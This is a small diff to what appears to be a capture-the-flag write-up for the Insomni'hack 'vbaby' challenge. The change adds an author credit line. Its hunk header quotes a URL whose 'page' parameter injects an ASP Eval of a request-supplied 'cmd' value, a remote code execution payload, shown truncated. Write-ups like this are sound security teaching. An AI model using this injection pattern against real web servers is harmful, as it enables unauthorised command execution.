@@ -40,3 +40,5 @@ http://vbaby.insomni.hack/Default.asp?page=%26Eval(Request("cmd"))&cmd=CreateObj
 ```
 ![Reading flag]({{ site.url }}/assets/reading-flag.png)
 
+
+Author: {% avatar qlemaire size=30 %} Quentin Lemaire \| [@QuentynLemaire](https://twitter.com/QuentynLemaire)
